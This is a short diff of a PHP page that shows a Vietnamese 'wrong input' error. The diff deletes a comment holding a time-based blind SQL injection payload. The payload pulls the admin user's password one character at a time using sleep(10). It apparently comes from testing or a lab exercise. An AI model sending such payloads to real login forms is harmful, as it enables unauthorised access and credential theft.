@@ -36,7 +36,7 @@
         {
             echo '<h2 class="error">'."Nhập sai rồi!!".'</h2>';
         }
-    }//a' and (SELECT IF(SUBSTRING(password, 1, 1)='k',sleep(10),'a') FROM users WHERE username like 'admin')='a'#
+    }
 ?>
 
 <!DOCTYPE html>
